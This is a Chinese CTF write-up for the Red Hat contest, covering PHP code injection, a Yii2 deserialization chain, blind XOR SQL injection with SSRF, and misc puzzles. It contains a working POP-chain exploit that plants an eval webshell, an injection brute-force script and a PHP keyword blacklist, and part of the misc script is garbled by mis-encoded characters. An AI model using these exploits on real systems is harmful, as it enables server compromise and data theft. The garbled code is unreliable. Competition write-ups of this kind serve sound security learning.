# 红帽wp

前言：这次和队里师傅一起打了红帽，做了几道题，但可惜还是没进线下，只能说还是太菜

## web1 find it	

御剑直接扫目录

![img](https://img-blog.csdnimg.cn/img_convert/1e9b4fd6e576054ddcc4449c2190e9e8.png)

得到一些熟悉的的东西，但是好像只有君子协定有用，打开得到一串文本

When I was a child,I also like to read Robots.txt Here is what you want:1ndexx.php

但是1ndexx.php打不开，猜测是否有备份

/.1ndexx.php.swp，得到源码

<?php $link = mysql_connect('localhost', 'root'); ?>
<html>
<head>
	<title>Hello worldd!</title>
	<style>
	body {
		background-color: white;
		text-align: center;
		padding: 50px;
		font-family: "Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif;
	}

	#logo {
		margin-bottom: 40px;
	}
	</style>
</head>
<body>
	<img id="logo" src="logo.png" />
	<h1><?php echo "Hello My freind!"; ?></h1>
	<?php if($link) { ?>
		<h2>I Can't view my php files?!</h2>
	<?php } else { ?>
		<h2>MySQL Server version: <?php echo mysql_get_server_info(); ?></h2>
	<?php } ?>
</body>
</html>
<?php

#Really easy...

$file=fopen("flag.php","r") or die("Unable 2 open!");

$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize("flag.php"));


$hack=fopen("hack.php","w") or die("Unable 2 open");

$a=$_GET['code'];

if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){
	die("you die");
}
if(strlen($a)>33){
	die("nonono.");
}
fwrite($hack,$a);
fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);

fclose($file);
fclose($hack);
?>
又到了熟悉的payload时间：/?code=<php%20phpinfo();?>

然后访问hack.php再次查看info，搜索flag直接得

flag{5bd378f8-2acd-4f94-8d95-531be33aba1a}

##  web2 framework

题目是yii2反序列化，百度搜素相关资料进行复现再回到题目，老套路扫目录发现了www.zip

下载到本地正好是源码，就直接本地搭环境，按照教程进行复现（这里附上）

https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40

在controllers下创建php，再建个poc.php,里面写上

<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'assert';
            $this->id = 'file_put_contents("/var/www/html/web/1.php","<?php eval(\$_POST[111]);");';
        }
    }
}
namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;
    
        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;
    
        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
随后生成payload传进去：/index.php?r=site/about&message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjczOiJmaWxlX3B1dF9jb250ZW50cygiL3Zhci93d3cvaHRtbC93ZWIvMS5waHAiLCI8P3BocCBldmFsKFwkX1BPU1RbMTExXSk7Iik7Ijt9aToxO3M6MzoicnVuIjt9fX19
传去有一个报错但是访问一下1.php是成功的。直接蚁剑一把梭，连上马，发现flag在根目录，但是大意了，没有权限，这里采用一个插件可以绕过（disabled_functions)然后读一下，就出了flag

flag{e5f2f9af-6e51-4e03-beee-861f3aae4c8a}

## web3 websitemanger

这道题是道注入题，是队友直接做出来，我没任何参与，但是复现出来，也在这里写上来。

跑一下sqlmap,发现两个参数：username password还有/image.php下的id

尝试注入，但前两个都不是，转换目标对id下手

这里卡了很久才发现是异或注入，构造payload：/image.phpid=1^(ascii(substr((select(database())),1,1))>1)^1

美滋滋有回显，改变参数：/image.php?id=1^(ascii(substr((select(database())),1,1))>99)^1

这次没回显，说明库里第一位是c，尝试获取第二位

/image.php?id=1^(ascii(substr((select(database())),2,1))>1)^1

发现117没有回显，第二位为t，由此可以尝试类推第三位为f，接下来第四位始终没有回显，说明只有三位，且库名就是ctf，知道了库名直接爆破：

import requests
import time
url = "http://eci-2zefme7yqvztqdsonszy.cloudeci1.ichunqiu.com/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{0},1))>{1})^1" 
word=""
for i in range(1,1000):
    l = 32
    h = 128
    mid = (l + h)
    while (l < h):
        nurl=url.format(i,mid)
        r=requests.get(url=nurl)
        if 'JFIF' in r.text:
            l = mid + 1
        else:
            h = mid
        mid = (l + h) // 2
        time.sleep(0.1)
    word += chr(mid)
    print(word)
print(word)
（队友的脚本）

或得表明users，依次修改url爆破，最后出来密码是3ef2870669ac4d2c27ea2（当时环境）

随后登录账号，抓包可以知道是ssrf，构造payload：file:// /flag

或得flag{c0590b8c-38fb-46da-a9c9-9dcc278030cb}

## misc1 签到题EBCDIC

题目就是WP，ebcdic编码转换成ascii编码，使用DD命令去操作，Linux命令

![img](C:\Users\16068\Documents\Tencent Files\1606838758\Image\C2C\{5C915D4C-4375-8E92-CFF9-958A449CB846}.jpg)

## misc2  colorfulcode

解压出俩文件，扔进010发现，data2里每三个数值对应了rgb的数值，data1数值对应了data2中的rgb颜色

![image-20210511222046875](C:\Users\16068\AppData\Roaming\Typora\typora-user-images\image-20210511222046875.png)

这里爆破下图片宽高，处理下data1中有几个空格，就有多少个像素，然后去质数分解下

![image-20210511222129742](C:\Users\16068\AppData\Roaming\Typora\typora-user-images\image-20210511222129742.png)

仔细观察data1中最大是19，那对应的data2的rgb最多也就20个，写脚本

from PIL import Image ᇆࢶୌڠ# pic = Image.new("RGB",(37,191),(255,255,255)) 20ӻRGBහഝڹ# color = [(0,0,0),(0,0,192),(0,255,255),(0,255,0),(255,192,255),(255,192,192), (192,192,255),(192,192,0),(255,0,255),(255,0,0),(192,0,0),(192,0,192), (255,255,255),(255,255,0),(255,255,192),(0,192,0),(0,192,192),(192,255,255), (192,255,192),(0,0,255)] #data1හഝ s = [5,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,12,0,0 ,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,3,0,0,0,0,0,0,0,0,12,0,0,12,0,0,5,12,12,12,12,12,12,12,12,12,12,12,12,12, 12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1 2,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12 ,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12, 12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1 2,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12 ,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,2,12,6,0,0,0 ,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,19,0,0,0,0,0,0,0,0,12,0,0,12,0, 0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,12,0,5,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,12,12,12,10,12 ,12,12,12,12,12,12,12,19,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12, 12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1 2,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12 ,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12, 12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12 ,12,12,2,12,9,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,19,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,18,0,0,0,0 ,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,3,0,0,0,0,0,0,0,0,12,0,0,12,0, 0,12,0,0,12,12,12,10,12,12,12,12,12,12,12,12,19,12,12,12,12,12,12,12,12,12,12,12,1 2,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12 ,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12, 12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1 2,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12 ,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,14,12,14,12,12, 12,12,12,12,12,12,12,12,12,12,2,12,6,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,12 ,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,12,0,0,0,0,0,0,0, 0,0,0,0,0,12,0,19,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,12,0,0,0,0,0,0,0,0,0,0,0,0,12,0,12,1 2,12,12,12,12,12,12,12,19,12,12,19,12,19,19,19,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,5,0,0,0,0,0,0,0,0,0,0,0,0,12,0,19,0,0,0,0, 0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,6,0,0,0,0,0,1,0,0,0,5 ,0,0,0,7,0,0,0,0,2,0,0,0,0,4,0,0,0,0,7,0,0,0,0,3,3,3,0,0,18,18,18,0,0,0,0,0,18,0,0 ,0,0,1,0,0,0,0,9,0,0,0,0,0,0,0,7,0,0,0,0,0,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,1 9,0,0,0,0,5,0,0,0,0,15,0,0,0,0,0,0,0,16,0,0,0,0,18,18,18,0,0,0,8,0,0,0,0,14,0,0,0, 0,18,18,18,0,0,0,0,0,11,0,0,0,0,12,0,9,16,16,0,0,0,0,0,0,0,0,0,0,12,0,3,0,0,0,0,0, 0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,6,0,0,0,0,0,1,0,0,0,5,0 ,0,0,7,0,0,0,0,2,0,0,0,0,4,0,0,0,0,7,0,0,0,0,4,0,3,0,0,11,0,18,0,0,0,0,0,18,0,0,0, 0,1,0,0,0,0,9,0,0,0,0,0,0,0,7,0,0,0,0,0,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0 ,0,0,0,5,0,0,0,0,15,0,0,0,0,0,0,0,16,0,0,0,0,11,0,18,0,0,0,8,0,0,0,0,14,0,0,0,0,11 ,0,18,0,0,0,0,0,11,0,0,0,0,12,0,17,0,2,0,0,0,0,0,0,0,0,0,0,12,0,6,0,0,0,0,0,0,0,0, 12,0,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7 ,0,0,0,0,2,0,0,0,0,4,0,0,0,0,7,0,0,0,0,11,0,12,0,0,8,0,12,0,0,0,0,0,18,0,0,0,0,1,0 ,0,0,0,9,0,0,0,0,0,0,0,7,0,0,0,0,0,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0,0,0, 0,5,0,0,0,0,15,0,0,0,0,0,0,0,16,0,0,0,0,8,0,12,0,0,0,8,0,0,0,0,14,0,0,0,0,8,0,12,0 ,0,0,0,0,11,0,0,0,0,12,0,4,0,12,0,0,0,0,0,0,0,0,0,0,12,0,13,12,12,5,5,5,9,12,5,2,0 ,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7,0,0 ,0,0,2,0,0,0,0,4,0,0,0,0,7,0,0,0,0,11,0,3,0,0,8,0,18,0,0,0,0,0,18,0,0,0,0,1,0,0,0,0,9,0,0,0,0,0,0,13,7,0,0,0,0,0,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,5, 0,0,0,0,15,0,0,0,0,0,0,2,16,0,0,0,0,8,0,18,0,0,0,8,0,0,0,0,14,0,0,0,0,8,0,18,0,0,0 ,0,0,11,0,0,0,0,12,0,19,0,12,0,0,0,0,0,0,0,0,0,0,12,0,12,0,0,0,0,0,0,0,0,12,0,0,12 ,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7,0,0,0,0, 2,0,0,0,0,4,0,0,0,0,7,0,0,0,0,19,0,9,0,0,19,0,5,0,0,0,0,0,18,0,0,0,0,1,0,0,0,0,9,0 ,0,0,0,0,0,13,7,0,0,0,0,14,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,5,0,0, 0,0,15,0,0,0,0,0,0,2,16,0,0,0,0,19,0,5,0,0,0,8,0,0,0,0,14,0,0,0,0,19,0,5,0,0,0,0,0 ,11,0,0,0,0,12,0,6,0,12,0,0,0,0,0,0,0,0,0,0,12,0,13,0,0,0,0,0,0,0,0,12,0,0,12,0,0, 12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,0,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7,0,0,0,0,2,0,0 ,0,0,4,0,0,0,0,7,0,0,0,0,6,0,9,0,0,6,0,5,0,0,0,0,0,18,0,0,0,0,1,0,0,0,0,9,0,0,0,0, 0,0,13,7,0,0,0,0,14,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,5,0,0,0,0,15, 0,0,0,0,0,0,2,16,0,0,0,0,6,0,5,0,0,0,8,0,0,0,0,14,0,0,0,0,6,0,5,0,0,0,0,0,11,0,0,0 ,0,12,0,6,0,12,0,0,0,0,0,0,0,0,0,0,12,0,8,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0 ,0,12,0,0,0,0,0,0,0,0,12,19,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7,0,0,0,0,2,0,0,0,0,4,0, 0,0,0,7,0,0,0,0,6,0,10,0,0,6,0,5,0,0,0,0,0,18,0,0,0,0,1,0,0,0,0,9,0,0,0,0,0,0,13,7 ,0,0,0,0,14,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,5,0,0,0,0,15,0,0,0,0, 0,0,2,16,0,0,0,0,6,0,9,0,0,0,8,0,0,0,0,14,0,0,0,0,6,0,5,0,0,0,0,0,11,0,0,0,0,12,0, 6,0,12,0,0,0,0,0,0,0,0,0,0,12,0,14,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,12,0 ,0,0,0,0,0,0,0,12,19,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7,0,0,0,0,2,0,0,0,0,4,0,0,0,0,7 ,0,0,0,0,5,0,14,0,0,6,0,9,0,0,0,0,0,18,0,0,0,0,1,0,0,0,0,9,0,0,0,0,0,0,13,7,0,0,0, 0,14,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,5,0,0,0,0,15,0,0,0,0,0,0,2,1 6,0,0,0,0,6,0,13,0,0,0,8,0,0,0,0,14,0,0,0,0,5,0,5,0,0,0,0,0,11,0,0,0,0,12,0,3,0,12 ,0,0,0,0,0,0,0,0,0,0,12,0,19,6,12,12,12,12,12,12,12,14,12,12,14,12,12,14,0,0,0,0,0 ,12,0,0,0,0,0,0,0,0,12,19,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7,0,0,0,0,2,0,0,0,0,4,0,0, 0,0,7,0,0,0,0,12,0,12,0,0,6,0,7,0,0,0,0,0,18,0,0,0,19,1,0,0,0,0,9,0,0,0,0,0,0,13,7 ,0,0,0,0,14,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,19,0,0,0,10,5,0,0,0,0,15,0,0,0,0 ,0,0,2,16,0,0,0,0,5,0,12,0,0,0,8,0,0,0,0,14,0,0,0,0,12,0,9,0,0,0,0,0,11,0,0,0,0,12 ,0,19,0,12,0,0,0,0,0,0,0,0,0,0,12,0,1,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,1 2,0,0,0,0,0,0,0,0,12,19,0,6,0,0,0,0,0,1,0,0,0,5,0,0,0,7,0,0,0,0,2,0,0,0,0,4,0,0,0, 0,7,0,0,0,0,12,0,12,0,0,6,0,12,0,0,0,0,0,18,0,0,0,19,1,0,0,0,0,9,0,0,0,0,0,0,13,7, 0,0,0,0,14,0,0,15,0,0,0,0,19,0,0,0,0,0,0,0,2,0,0,19,0,0,0,10,5,0,0,0,0,15,0,0,0,0, 0,0,2,16,0,0,0,0,12,0,12,0,0,0,8,0,0,0,0,14,0,0,0,0,12,0,13,0,0,0,0,0,11,0,0,0,0,1 2,0,17,0,12,0,0,0,0,0,0,0,0,0,0,12,0,4,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0, 12,0,0,0,0,0,0,0,0,12,19,0,6,0,0,0,0,19,1,6,0,0,5,0,0,0,7,14,0,0,17,2,0,0,0,0,4,8, 0,0,0,7,0,0,0,0,12,0,12,0,0,5,0,12,0,0,14,0,15,18,3,0,0,19,1,0,0,0,0,9,10,0,0,0,0, 0,13,7,0,0,0,0,14,0,0,15,18,0,0,0,19,0,0,0,0,0,0,0,2,0,0,19,1,0,0,10,5,0,0,0,0,15, 18,0,0,0,0,0,2,16,0,0,0,0,12,0,12,0,0,4,8,11,0,0,0,14,0,0,0,0,12,0,12,0,0,0,0,0,11 ,0,0,0,0,12,0,16,0,12,0,0,0,0,0,0,0,0,0,0,12,0,17,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12 ,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,19,0,6,0,0,0,0,19,1,6,0,0,5,0,0,0,7,14,0,0,17,2,0 ,0,0,0,4,8,0,0,13,7,0,0,0,0,12,0,12,0,0,12,0,12,0,0,14,0,15,18,3,0,0,19,1,0,0,0,5, 9,10,0,0,0,0,0,13,7,0,0,0,0,14,0,0,15,18,0,0,6,19,0,0,0,0,0,0,0,2,0,0,19,1,0,0,10, 5,0,0,0,0,15,18,0,0,0,0,0,2,16,0,0,0,0,12,0,12,0,0,4,8,11,0,0,0,14,0,0,0,0,12,0,12 ,0,0,0,0,8,11,0,0,0,0,12,0,6,0,12,0,0,0,0,0,0,0,0,0,0,12,0,11,0,0,0,0,0,0,0,0,12,0 ,0,12,0,0,12,0,0,0,0,0,12,0,0,0,0,0,0,0,0,12,19,0,6,0,0,0,0,19,1,6,0,0,5,0,0,0,7,1 4,0,0,17,2,0,0,0,0,4,8,0,0,13,7,0,0,0,0,12,0,12,0,0,12,0,12,0,0,14,0,15,18,3,0,0,1 9,1,0,0,0,5,9,10,0,0,0,10,0,13,7,0,0,0,0,14,0,0,15,18,0,0,6,19,0,0,0,0,0,0,0,2,0,0 ,19,1,0,0,10,5,0,0,0,0,15,18,0,0,0,18,0,2,16,0,0,0,0,12,0,12,0,0,4,8,11,0,0,0,14,0 ,0,0,0,12,0,12,0,0,0,0,8,11,0,0,0,0,12,0,10,0,12,0,13,0,0,0,0,0,0,0,0,12,0,18,15,1 2,12,12,12,12,12,12,11,12,12,11,0,0,12,0,0,0,0,0,12,0,0,0,0,5,5,5,0,12,19,0,6,19,0,0,0,19,1,6,0,0,5,9,0,0,7,14,0,0,17,2,16,0,0,0,4,8,0,0,13,7,14,0,0,0,12,0,12,0,0,1 2,0,12,0,0,14,0,15,18,3,0,0,19,1,6,0,0,5,9,10,0,0,0,10,0,13,7,0,0,0,0,14,0,3,15,18 ,0,0,6,19,1,0,0,0,0,0,0,2,0,6,19,1,0,0,10,5,9,0,0,0,15,18,0,0,0,18,0,2,16,0,0,0,0, 12,0,12,0,0,4,8,11,0,0,0,14,13,0,0,0,12,0,12,0,0,0,0,8,11,0,0,0,0,12,0,9,0,12,0,13 ,7,0,0,4,0,0,0,0,12,0,3,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,16,0,0,0,0,0,12 ,0,0,12,19,0,6,19,0,0,0,19,1,6,0,0,5,9,0,0,7,14,0,0,17,2,16,0,0,11,4,8,0,0,13,7,14 ,0,0,0,12,0,12,0,0,12,0,12,0,0,14,0,15,18,3,0,0,19,1,6,0,0,5,9,10,0,0,0,10,0,13,7, 14,0,0,0,14,0,3,15,18,0,0,6,19,1,0,0,0,0,0,0,2,0,6,19,1,0,0,10,5,9,0,0,3,15,18,0,0 ,0,18,0,2,16,17,0,0,0,12,0,12,0,0,4,8,11,0,0,7,14,13,0,0,0,12,0,12,0,0,0,0,8,11,4, 0,0,0,12,0,5,0,12,0,13,7,0,0,4,0,0,0,0,12,0,16,0,0,0,0,0,0,0,0,12,0,5,5,5,12,5,12, 12,5,6,10,17,2,1,19,12,12,12,0,0,12,19,1,6,19,1,8,9,19,1,6,19,4,5,9,10,13,7,14,13, 18,17,2,16,17,1,11,4,8,11,9,13,7,14,13,18,17,12,0,12,12,17,12,0,12,12,17,14,13,15, 18,3,15,2,19,1,6,19,4,5,9,10,5,7,15,10,5,13,7,14,13,18,17,14,13,3,15,18,3,17,6,19, 1,6,11,10,1,6,8,2,16,6,19,1,6,11,10,5,9,10,13,3,15,18,3,17,6,18,3,2,16,17,2,6,4,12 ,0,12,12,12,4,8,11,4,10,7,14,13,7,3,2,12,0,12,12,12,2,13,8,11,4,8,5,14,12,12,5,0,1 2,14,13,7,14,8,4,8,11,17,2,10,0,2,0,0,0,0,0,0,0,0,12,0,0,12,0,0,12,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 